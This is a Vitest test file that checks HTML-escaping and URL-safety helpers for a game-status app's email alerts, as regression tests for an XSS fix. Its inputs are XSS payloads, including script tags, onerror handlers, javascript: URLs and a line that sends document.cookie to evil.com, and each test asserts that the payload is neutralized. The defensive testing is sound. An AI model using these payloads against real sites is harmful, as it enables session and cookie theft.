/**
 * Tests for HTML Utility Functions
 *
 * Verifies that the HTML escaping and sanitization functions properly
 * prevent XSS attacks as addressed in Issue #13.
 *
 * Key security requirements tested:
 * - All HTML special characters are escaped
 * - XSS payloads are neutralized
 * - URLs with dangerous protocols are blocked
 * - Edge cases are handled correctly
 *
 * @module htmlUtils.test
 */
import { describe, it, expect } from "vitest";
import {
  escapeHtml,
  escapeHtmlAttribute,
  isSafeUrl,
  sanitizeUrl,
} from "../lib/htmlUtils";

describe("HTML Escaping (Issue #13 Fix)", () => {
  describe("escapeHtml", () => {
    it("should escape ampersand characters", () => {
      expect(escapeHtml("Tom & Jerry")).toBe("Tom &amp; Jerry");
      expect(escapeHtml("A & B & C")).toBe("A &amp; B &amp; C");
    });

    it("should escape less-than characters", () => {
      expect(escapeHtml("<script>")).toBe("&lt;script&gt;");
      expect(escapeHtml("1 < 2")).toBe("1 &lt; 2");
    });

    it("should escape greater-than characters", () => {
      expect(escapeHtml("a > b")).toBe("a &gt; b");
      expect(escapeHtml("</script>")).toBe("&lt;&#x2F;script&gt;");
    });

    it("should escape double quotes", () => {
      expect(escapeHtml('Say "hello"')).toBe("Say &quot;hello&quot;");
    });

    it("should escape single quotes", () => {
      expect(escapeHtml("It's working")).toBe("It&#x27;s working");
    });

    it("should escape forward slashes", () => {
      expect(escapeHtml("path/to/file")).toBe("path&#x2F;to&#x2F;file");
    });

    it("should escape backticks", () => {
      expect(escapeHtml("code `snippet`")).toBe("code &#x60;snippet&#x60;");
    });

    it("should escape equals signs", () => {
      expect(escapeHtml("a=b")).toBe("a&#x3D;b");
    });

    it("should handle empty strings", () => {
      expect(escapeHtml("")).toBe("");
    });

    it("should handle strings with no special characters", () => {
      expect(escapeHtml("Hello World")).toBe("Hello World");
      expect(escapeHtml("Game Status 2025")).toBe("Game Status 2025");
    });

    it("should handle non-string inputs gracefully", () => {
      expect(escapeHtml(null as unknown as string)).toBe("");
      expect(escapeHtml(undefined as unknown as string)).toBe("");
      expect(escapeHtml(123 as unknown as string)).toBe("");
    });

    it("should escape multiple special characters in the same string", () => {
      const input = '<script>alert("XSS")</script>';
      const expected =
        "&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;";
      expect(escapeHtml(input)).toBe(expected);
    });
  });

  describe("XSS Attack Prevention", () => {
    it("should neutralize script injection attacks", () => {
      const attacks = [
        '<script>alert("XSS")</script>',
        "<script>document.cookie</script>",
        '<img src="x" onerror="alert(1)">',
        '<a href="javascript:alert(1)">click</a>',
        "<body onload=alert(1)>",
        '<svg onload="alert(1)">',
      ];

      for (const attack of attacks) {
        const escaped = escapeHtml(attack);
        // Should not contain unescaped < or >
        expect(escaped).not.toContain("<");
        expect(escaped).not.toContain(">");
        // Should not be executable
        expect(escaped).not.toMatch(/<script/i);
      }
    });

    it("should neutralize attribute injection attacks", () => {
      const attacks = [
        '" onclick="alert(1)"',
        "' onclick='alert(1)'",
        '" onfocus="alert(1)" autofocus="',
        '"><script>alert(1)</script><"',
      ];

      for (const attack of attacks) {
        const escaped = escapeHtml(attack);
        // Should not contain unescaped quotes
        expect(escaped).not.toContain('"');
        expect(escaped).not.toContain("'");
      }
    });

    it("should handle encoded XSS attempts", () => {
      // These are already decoded, so escaping should still work
      const attacks = [
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<IMG SRC=javascript:alert('XSS')>",
        "<IMG SRC=`javascript:alert(1)`>",
      ];

      for (const attack of attacks) {
        const escaped = escapeHtml(attack);
        expect(escaped).not.toContain("<");
        expect(escaped).not.toContain(">");
      }
    });

    it("should prevent HTML entity bypass attempts", () => {
      // If someone tries to use HTML entities in their payload
      const input = "&lt;script&gt;";
      const escaped = escapeHtml(input);
      // The ampersands should be escaped
      expect(escaped).toBe("&amp;lt;script&amp;gt;");
    });
  });

  describe("Real-World Game Name Scenarios", () => {
    it("should safely escape normal game names", () => {
      const gameNames = [
        "World of Warcraft",
        "Counter-Strike 2",
        "Final Fantasy XIV",
        "Apex Legends",
        "League of Legends",
      ];

      for (const name of gameNames) {
        const escaped = escapeHtml(name);
        // Normal names should pass through with minimal changes
        expect(escaped).not.toContain("<");
        expect(escaped).not.toContain(">");
      }
    });

    it("should handle game names with special characters", () => {
      expect(escapeHtml("Tom Clancy's Rainbow Six")).toBe(
        "Tom Clancy&#x27;s Rainbow Six"
      );
      expect(escapeHtml("Baldur's Gate 3")).toBe("Baldur&#x27;s Gate 3");
    });

    it("should handle malicious game names", () => {
      const maliciousName = '<img src=x onerror="alert(document.cookie)">';
      const escaped = escapeHtml(maliciousName);
      // Key security: the < and > are escaped, breaking the HTML tag structure
      expect(escaped).not.toContain("<");
      expect(escaped).not.toContain(">");
      // The text "onerror" is still present but it's no longer an attribute
      // because the img tag is broken (&lt;img... instead of <img...)
      expect(escaped).toContain("&lt;img");
      expect(escaped).toContain("onerror");  // Text is preserved, but safe
    });
  });
});

describe("escapeHtmlAttribute", () => {
  it("should escape attribute values the same as escapeHtml", () => {
    const testCases = [
      "normal value",
      '"quoted"',
      "'single quoted'",
      'mixed "quotes\' here',
      "<script>",
    ];

    for (const input of testCases) {
      expect(escapeHtmlAttribute(input)).toBe(escapeHtml(input));
    }
  });
});

describe("URL Safety Functions", () => {
  describe("isSafeUrl", () => {
    it("should allow https URLs", () => {
      expect(isSafeUrl("https://example.com")).toBe(true);
      expect(isSafeUrl("https://gamestatus.app/dashboard")).toBe(true);
    });

    it("should allow http URLs", () => {
      expect(isSafeUrl("http://localhost:3000")).toBe(true);
      expect(isSafeUrl("http://example.com")).toBe(true);
    });

    it("should allow relative URLs", () => {
      expect(isSafeUrl("/api/unsubscribe")).toBe(true);
      expect(isSafeUrl("./page")).toBe(true);
      expect(isSafeUrl("../other")).toBe(true);
    });

    it("should block javascript: protocol", () => {
      expect(isSafeUrl("javascript:alert(1)")).toBe(false);
      expect(isSafeUrl("JavaScript:alert(1)")).toBe(false);
      expect(isSafeUrl("JAVASCRIPT:ALERT(1)")).toBe(false);
      expect(isSafeUrl("  javascript:alert(1)")).toBe(false);
    });

    it("should block data: protocol", () => {
      expect(isSafeUrl("data:text/html,<script>alert(1)</script>")).toBe(false);
      expect(isSafeUrl("DATA:text/html,test")).toBe(false);
    });

    it("should block vbscript: protocol", () => {
      expect(isSafeUrl("vbscript:msgbox(1)")).toBe(false);
    });

    it("should block file: protocol", () => {
      expect(isSafeUrl("file:///etc/passwd")).toBe(false);
    });

    it("should handle empty and invalid inputs", () => {
      expect(isSafeUrl("")).toBe(false);
      expect(isSafeUrl("   ")).toBe(false);
      expect(isSafeUrl(null as unknown as string)).toBe(false);
      expect(isSafeUrl(undefined as unknown as string)).toBe(false);
    });
  });

  describe("sanitizeUrl", () => {
    it("should return safe URLs with HTML escaping", () => {
      expect(sanitizeUrl("https://example.com")).toBe("https:&#x2F;&#x2F;example.com");
    });

    it("should return empty string for unsafe URLs", () => {
      expect(sanitizeUrl("javascript:alert(1)")).toBe("");
      expect(sanitizeUrl("data:text/html,test")).toBe("");
    });

    it("should escape special characters in safe URLs", () => {
      const url = "https://example.com/?q=test&foo=bar";
      const sanitized = sanitizeUrl(url);
      expect(sanitized).toContain("&amp;");
    });
  });
});

describe("Email Template Security (Issue #13 Regression Tests)", () => {
  it("should prevent XSS in email subject line context", () => {
    // In email subjects, special characters are less dangerous but should still be escaped
    const maliciousGameName = '<script>alert("XSS")</script>';
    const escapedName = escapeHtml(maliciousGameName);

    // When used in subject: `${escapedName} is back online`
    expect(escapedName).not.toContain("<script>");
  });

  it("should prevent XSS in email body HTML context", () => {
    const maliciousGameName = '<img src=x onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">';
    const escapedName = escapeHtml(maliciousGameName);

    // Should be safe to interpolate into HTML
    const htmlSnippet = `<h2>${escapedName} is back online!</h2>`;
    // The img tag structure is broken - no executable HTML
    expect(htmlSnippet).not.toContain("<img");
    expect(htmlSnippet).toContain("&lt;img");  // Escaped version is present
    // The text "onerror" is present but not as an attribute (tag is broken)
    expect(htmlSnippet).toContain("onerror");  // Text preserved but safe
  });

  it("should handle region parameter safely", () => {
    const maliciousRegion = '"><script>alert(1)</script><"';
    const escapedRegion = escapeHtml(maliciousRegion.toUpperCase());

    expect(escapedRegion).not.toContain("<script>");
    expect(escapedRegion).not.toContain('"');
  });

  it("should handle timestamp safely", () => {
    // Timestamps should be safe, but we escape anyway for defense in depth
    const timestamp = new Date().toISOString();
    const escapedTimestamp = escapeHtml(timestamp);

    // ISO timestamps don't have special chars, but verify escaping works
    expect(escapedTimestamp).toBe(timestamp);
  });

  it("simulates the actual email template escaping", () => {
    // This simulates what happens in alertNotifications.ts sendAlertEmail
    const gameName = '<script>steal()</script>';
    const region = "na";

    const safeGameName = escapeHtml(gameName);
    const safeRegion = escapeHtml(region.toUpperCase());

    // Simulate the HTML template
    const htmlBody = `
      <h2>${safeGameName} is back online!</h2>
      <p>The ${safeGameName} servers in the <strong>${safeRegion}</strong> region are now online.</p>
    `;

    // Verify no unescaped content
    expect(htmlBody).not.toContain("<script>");
    expect(htmlBody).toContain("&lt;script&gt;");
  });
});

describe("Unicode and Edge Cases", () => {
  it("should handle unicode characters correctly", () => {
    const unicode = "日本語ゲーム";
    expect(escapeHtml(unicode)).toBe(unicode);
  });

  it("should handle emoji in game names", () => {
    const emoji = "Game 🎮 Status";
    expect(escapeHtml(emoji)).toBe(emoji);
  });

  it("should handle very long strings", () => {
    const longString = "a".repeat(10000) + "<script>" + "b".repeat(10000);
    const escaped = escapeHtml(longString);
    expect(escaped).not.toContain("<script>");
    expect(escaped).toContain("&lt;script&gt;");
  });

  it("should handle strings with only special characters", () => {
    const special = '<>&"\'`=/';
    const escaped = escapeHtml(special);
    expect(escaped).toBe("&lt;&gt;&amp;&quot;&#x27;&#x60;&#x3D;&#x2F;");
  });

  it("should handle newlines and whitespace", () => {
    const withNewlines = "Line 1\nLine 2\r\nLine 3";
    const escaped = escapeHtml(withNewlines);
    expect(escaped).toBe(withNewlines); // Newlines are safe
  });

  it("should handle null bytes and control characters", () => {
    const withNull = "test\x00test";
    const escaped = escapeHtml(withNull);
    expect(escaped).toBe("test\x00test"); // Null bytes pass through
  });
});
